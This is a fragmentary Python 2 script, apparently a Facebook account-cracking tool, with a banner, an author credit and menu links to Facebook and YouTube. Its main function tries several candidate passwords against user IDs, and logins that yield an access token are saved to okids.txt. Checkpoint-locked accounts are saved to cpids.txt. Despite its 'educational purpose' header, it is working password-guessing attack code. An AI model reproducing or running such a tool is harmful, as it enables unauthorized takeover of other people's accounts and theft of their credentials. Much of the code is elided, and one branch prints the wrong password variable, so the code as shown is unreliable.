#Script Given By Abdul Tuan
#Script Is Given For Educational Purpose
#Script Edited By @TUAN
#Utf-8 python 
...
TUAN = ['welcome to my commmand']
TUANchoice = random.choice(TUAN)
agents = [
...
/033[0;92d888888P dP     dP  .d888888  888888ba  
   88    88     88 d8'    88  88    `8b 
   88    88     88 88aaaaa88a 88     88 
   88    88     88 88     88  88     88 
   88    Y8.   .8P 88     88  88     88 
   dP    `Y88888P' 88     88  dP     dP 
oooooooooooooooooooooooooooooooooooooooo
                                        
                          
\n\033[0m-------------------------------------------------------------------
\033[1;92mAuthor \033[1;93m: Abdul Tuan
\033[1;92mFb \033[1;93m: Abdul Barek Tuan
...
def main():
    ...
    print ' \033[0m[2].\x1b[1;96m joint my fb group'
    print ' \033[0m[3].\x1b[1;96m my facbook id '
...
def log_sel():
    select = raw_input('https://www.facebook.com/groups/4616461305068632/')
    if select == '1':
        menu()
    elif select == '2':
        os.system('xdg-open https://www.facebook.com/mdshomeja.alamin')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https://youtu.be/FWE2lLY3-_0')
        main()
    else:
        print ''
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[TUAN-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[TUAN-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[TUAN-OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('okids.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;31m[TUAN-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[TUAN-OK]\033[0m ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('okids.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;31m[TUAN-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks TechQaiser.& Also SyedZada Bro
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
